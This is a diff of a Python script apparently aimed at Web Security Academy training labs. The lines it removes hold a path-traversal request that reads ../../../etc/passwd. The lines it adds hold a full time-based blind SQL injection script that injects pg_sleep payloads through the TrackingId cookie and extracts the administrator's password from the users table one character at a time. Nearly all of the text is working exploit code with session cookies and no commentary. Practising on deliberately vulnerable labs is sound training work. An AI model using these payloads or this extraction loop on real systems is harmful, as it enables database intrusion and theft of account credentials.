@@ -1,22 +1,33 @@
-# GET /image?filename=../../../etc/passwd HTTP/2
-# Host: 0acd00ba031f53b18291892d007900ab.web-security-academy.net
-# Cookie: session=qPgKpOYGKBeRiZSgPYU0tCIojM9Htu2k
-# Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
-# Sec-Ch-Ua-Mobile: ?0
-# Sec-Ch-Ua-Platform: "Linux"
-# Accept-Language: en-US,en;q=0.9
-# Upgrade-Insecure-Requests: 1
-# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
-# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-# Sec-Fetch-Site: none
-# Sec-Fetch-Mode: navigate
-# Sec-Fetch-User: ?1
-# Sec-Fetch-Dest: document
-# Accept-Encoding: gzip, deflate, br
-# Priority: u=0, i
-
 import requests
+import time
 
-url = "https://0acd00ba031f53b18291892d007900ab.web-security-academy.net/image?filename=../../../etc/passwd"
-r = requests.get(url, cookies={"session=": "qPgKpOYGKBeRiZSgPYU0tCIojM9Htu2k"})
-print(r.text)
+url = "https://0a2400d70355daa981942ae50063006e.web-security-academy.net/filter?category=Gifts"
+cookies = {
+    "TrackingId": "jmXrzZJq1ms1QSkK",
+    "session": "KSOEAdX8r0S1MwFb7YabJzQW8mOUWtMb"
+}
+
+def getTime(payload):
+    cookies_payload = cookies.copy()
+    cookies_payload["TrackingId"] += payload
+    start_time = time.time()
+    response = requests.get(url, cookies=cookies_payload)
+    elapsed_time = time.time() - start_time
+    return elapsed_time
+
+def extractPassword():
+    extracted_password = ""
+    chars = "abcdefghijklmnopqrstuvwxyz0123456789-_"
+
+    for pos in range(1, 21):
+        for char in chars:
+            payload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pos},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
+            time = getTime(payload)
+            if time > 6:
+                print(f"Found character '{char}' at position {pos}")
+                extracted_password += char
+                break
+    return extracted_password
+
+password = extractPassword()
+print(password)
